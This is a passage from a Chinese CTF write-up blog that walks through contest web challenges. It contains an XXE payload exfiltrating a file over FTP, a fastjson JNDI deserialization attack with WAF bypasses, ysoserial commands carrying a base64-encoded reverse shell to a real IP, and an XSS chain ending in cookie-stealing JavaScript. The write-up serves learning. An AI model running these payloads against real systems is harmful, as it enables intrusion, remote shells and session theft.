+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311141959966.png" alt="image-20200311141959966"></p>
+<ul>
+<li>ftp</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">any</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span>  <span class="meta-string">"http://ip/gxzy.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%xxe;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">number</span>&gt;</span>fffff<span class="tag">&lt;/<span class="name">number</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//gxzy.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">payload</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; trick SYSTEM 'ftp://ip:2121/%payload;'&gt;"</span>&gt;</span></span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/Inkedimage-20200311142521849_LI-1584922557726.jpg" alt="Inkedimage-20200311142521849_LI"></p>
+<p>按照比赛来这时我们得到了pom.xml文件，</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">Method%uFF1A post</span><br><span class="line">Path %uFF1A /you_never_know_the_path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.tr1ple<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sus<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>baby_java<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Spring Boot<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-configuration2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>saxpath<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>saxpath<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-FCS<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-configuration<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-configuration<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-lang<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-lang<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flex.blazeds<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flex-messaging-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.7.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.48<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.vintage<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-vintage-engine<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到有一个/you_never_know_the_path路径，还有1.2.48fastjson,还有这个commons-collections东东，然后查了下fastjson的最近的漏洞，<a href="https://0day.design/2020/01/30/fastjson%20%E8%A7%A6%E5%8F%91%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">这篇</a>文章具体的分析了漏洞，然后这里就贴出payload，</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit\"&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后用这个payload打的话，还是会触发waf,</p>
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311143155288.png" alt="image-20200311143155288"></p>
+<p>然后测试发现对type和prefix进行了过滤，从上面那篇文章可以知道</p>
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311143500149.png" alt="image-20200311143500149"></p>
+<p>那么就可以通过十六进制绕过type的过滤，然后就是prefix的绕过，</p>
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311144231267.png" alt="image-20200311144231267"></p>
+<p><a href="http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/#0x04-%E9%A2%98%E5%A4%96%E8%AF%9D" target="_blank" rel="noopener">图片来源</a></p>
+<p>然后这里就通过在prefix前面加-来绕过，然后就是在vps上开一个JRMPListener,然后通过fastjson的漏洞触发服务器连接vps的JRMPListener，然后给服务器发送序列化的payload,触发服务器反序列化，最后rce。</p>
+<p>payload：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener  8888 CommonsCollections7 'bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDQuMzQuMjAwLjE1MS81MDAwMCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;'</span><br><span class="line">java -cp ysoserial.jar  ysoserial.exploit.JRMPClient  144.34.200.151 7777  CommonsCollections7 'bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDQuMzQuMjAwLjE1MS81MDAwMCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;'</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@\x74ype&quot;:&quot;org.apache.commons.configuration.JNDIConfiguration&quot;,&quot;-prefix&quot;:&quot;rmi:&#x2F;&#x2F;ip:8888&#x2F;Exploit&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功反弹shell。</p>
+<img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311145143273.png" alt="image-20200311145143273" style="zoom:200%;">
+
+<p>另外还有用在vps上开了一个LDAPServer,来反弹shell，由于java还不是太熟，这里没有复现，师傅有会的可以六个链接啥的，教教我这个菜鸡，</p>
+<p>参考：<a href="http://ctf.njupt.edu.cn/382.html#hackme" target="_blank" rel="noopener">http://ctf.njupt.edu.cn/382.html#hackme</a></p>
+<h1 id="0x03-happy-vacation"><a href="#0x03-happy-vacation" class="headerlink" title="0x03  happy vacation"></a>0x03  happy vacation</h1><p>前一篇文章已经记录了这道题的非预期解，比较简单，这道题的预期解是xss,接下来进行分析，</p>
+<p>xss的触发点在index.php</p>
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312111745170.png" alt="image-20200312111745170"></p>
+<p>然后跟进lib.php中的showMessage</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showMessage</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;body&gt;&lt;script&gt; var a = '&#123;$this-&gt;info-&gt;message&#125;';document.write(a);&lt;/script&gt;&lt;/body&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里会把$this-&gt;info-&gt;message，输出出来，如果我们闭合这里的单引号，在后面加上js语句，就可以进行xss。然后继续看$this-&gt;info-&gt;message，这个值是</p>
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312112258374.png" alt="image-20200312112258374"></p>
+<p>我们get输入的message变量，然后调用leavemessage对输入进行检测后赋给$this-&gt;info-&gt;message。</p>
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312112213426.png" alt="image-20200312112213426"></p>
+<p>可以看到这里对message进行了addslashes处理，所以我们如果想闭合之前的单引号，就可以通过像sql注入中宽字节注入的方法，</p>
+<img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312112846438.png" alt="image-20200312112846438" style="zoom:200%;">
+
+<p><a href="https://wizardforcel.gitbooks.io/xss-naxienian/content/3.html" target="_blank" rel="noopener">图片</a></p>
+<p>然后就需要找到可以设置响应编码的地方，同时这道题还有一个eval的利用点，</p>
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312113714354.png" alt="image-20200312113714354"></p>
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312113641620.png" alt="image-20200312113641620"></p>
+<p>会把我们输入的answer拼接到命令执行中，而且前面还用了clone浅复制</p>
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312113840370.png" alt="image-20200312113840370"></p>
+<p>所以我们可以在这里修改user的属性，然后分析lib.php中的go函数</p>
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312114156603.png" alt="image-20200312114156603"></p>
+<p>如果this-&gt;location不等于this-&gt;page，那么就会调用go()函数，go函数中会把pre after location 进行拼接，然后传给header,如果可以控制这三个变量，就可以在这里设置gb18130编码，达到宽字节注入。然后可以在本地测试，把源码中的//var_dump($user)；注释删掉，可以更清晰的看出，</p>
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312114803092.png" alt="image-20200312114803092"></p>
+<p>在 quiz.php中52，53行</p>
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312115014677.png" alt="image-20200312115014677"></p>
+<p>url-&gt;page为index,如果这里传入的referer不等于index的话，就会把$referer赋给user-&gt;url-&gt;referer，然后在45，46行，如果$user-&gt;url-&gt;referer != $user-&gt;url-&gt;page，将user-&gt;url-&gt;referer赋给user-&gt;url-&gt;location，所以这里通过发送两次请求，就可以控制$user-&gt;url-&gt;location的值，然后就可以调用header函数，paylaod如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quiz.php?referer&#x3D;Content-Type: text&#x2F;html; charset&#x3D;GBK; kkkk: &amp;answer&#x3D;user-%3Eurl-%3Epre</span><br></pre></td></tr></table></figure>
+
+<p>然后这里我们可以进行xss，但是在lib.php开头</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"style-src 'self'; script-src 'unsafe-inline' http://&lt;?=$_SERVER['HTTP_HOST']?&gt;/; object-src 'none'; frame-src 'self'"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>设置了csp，就不能在message直接传入我们vps或xss平台的链接了，然后这道题目还有一个文件上传的点，我们可以上传一个文件内容为</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">window</span>.location = <span class="string">"http://ip:8888/"</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(a,<span class="number">1</span>);</span><br><span class="line"><span class="comment">//或</span></span><br><span class="line">location.href=<span class="string">"//xxxxxxx?c="</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie）</span><br></pre></td></tr></table></figure>
+
+<p>的文件，后缀可以设为txt,然后在index.php中传入message值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?message&#x3D;%df%27;jscode;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>python脚本：</p>
